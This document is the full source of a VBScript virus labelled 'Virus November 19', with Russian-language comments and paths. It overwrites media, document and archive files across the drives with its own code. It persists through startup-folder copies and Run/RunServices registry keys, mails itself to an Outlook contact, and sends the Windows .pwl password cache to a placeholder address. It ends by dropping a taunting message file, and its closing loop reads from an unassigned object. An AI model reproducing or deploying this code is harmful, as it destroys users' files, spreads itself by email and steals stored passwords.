rem Virus November 19 
rem Made in Russian Federation

on error resume next
set f=createobject("scripting.filesystemobject")
m=wscript.scriptfullname
for each d in f.drives
if d.drivetype=2 or d.drivetype=3  then
for each p in f.getfolder(d.path).subfolders
for each v in f.getfolder (p.path).files
if right(v.path,4)=".jpg"or right(v.path,4)=".txt"or right(v.path,4)=".vbs"or right(v.path,4)=".doc" or right(v.path,4)=".gif" or right(v.path,4)=".mp3" or right(v.path,4)=".mp2" or right(v.path,4)=".mp4" or right(v.path,4)=".avi" or right(v.path,4)=".rar" or right(v.path,4)=".zip" then
v.attributes=0
f.opentextfile(v.path,2).write f.opentextfile (m).readall
 END IF
next
next
end if
next
On Error Resume Next
Dim FileSysObject, File, AA, A1, A2, A10, S, F
Set FileSysObject = CreateObject ("Scripting.FileSystemObject")
Set File = FileSysObject.GetFile(WScript.ScriptFullName)
File.Copy ("c:\windows\Rnapp.vbs")
File.Copy ("c:\windows\System\System.vbs")
File.Copy ("c:\windows\details.vbs")
File.Copy ("C:\Windows\главное меню\программы\автозагрузка\MsOffice-VBSScript.vbs")
Dim WshShell
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Rundll", "c:\windows\Rnapp.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\System", "c:\windows\system\system.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Rnapp", "C:\WINDOWS\system\system.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\internat", "C:\WINDOWS\Rnapp.vbs"
Dim OutlookObject, OutMail
Set OutlookObject = CreateObject("Outlook.Application")
Set OutMail = OutlookObject.CreateItem(0)
OutMail.to = OutlookObject.GetNameSpace("MAPI").AddressLists(1).AddressEntries(1)
OutMail.Subject = "Тема залипухи!"
OutMail.Body = "Залипуха" 
OutMail.Attachments.Add"c:\windows\details.vbs"
OutMail.Send
Dim OutlookObject2, OutMail2
Set OutlookObject2 = CreateObject("Outlook.Application")
Set OutMail2 = OutlookObject.CreateItem(0)
OutMail2.to = "Ваш емаил"
OutMail2.Subject = "Тема письма"
OutMail2.Body = "Текст письма"
OutMail2.Attachments.Add"C:\Windows\*.pwl"
OutMail2.Send
Set AA = CreateObject("Scripting.FileSystemObject")
Set A2 = AA.CreateTextFile("C:\windows\рабочий стол\Прочти.doc")
A2.WriteLine("I am Virus November 19.Your computer destroy!!!")
Do While A1.AtEndOfStream = False 
A2.WriteLine( A1.ReadLine)
Loop
A1.Close
A2.Close

